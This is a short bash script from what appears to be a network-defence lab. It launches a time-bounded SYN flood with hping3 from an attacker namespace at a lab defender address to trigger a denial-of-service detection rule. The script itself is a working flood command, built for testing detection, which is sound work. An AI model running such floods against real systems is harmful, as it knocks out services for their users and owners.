#!/usr/bin/env bash
# ==============================================================================
# attack/scenarios/syn_flood.sh
# SYN flood from the attacker namespace -> 'dos_flood' family -> R-DOS (recommend:
# detected + mitigation proposed; policy keeps DoS mitigation analyst-gated).
# Requires root and a running lab (sudo defend/setup_netns.sh). hping3 must be
# installed (sudo attack/setup.sh).
#
#   sudo attack/scenarios/syn_flood.sh
#
# Env overrides: PORT (target port, default 22), DURATION (seconds, default 6).
# ==============================================================================
set -uo pipefail
cd "$(dirname "$0")/../.."
# shellcheck disable=SC1091
source ./defend/lab.env

PORT="${PORT:-22}"
DURATION="${DURATION:-6}"

if ! command -v hping3 >/dev/null 2>&1; then
    echo "[-] hping3 not found. Install it first: sudo attack/setup.sh" >&2
    exit 1
fi

echo "[attack] SYN flood $ATTACKER_LAB_IP -> $DEFENDER_LAB_IP:$PORT (single flow, ~${DURATION}s)"
# timeout bounds the flood; run.sh execs hping3 inside the attacker netns.
timeout "$DURATION" attack/run.sh \
    hping3 -S --flood -p "$PORT" -s 5000 -k "$DEFENDER_LAB_IP" || true
echo "[attack] flood complete"
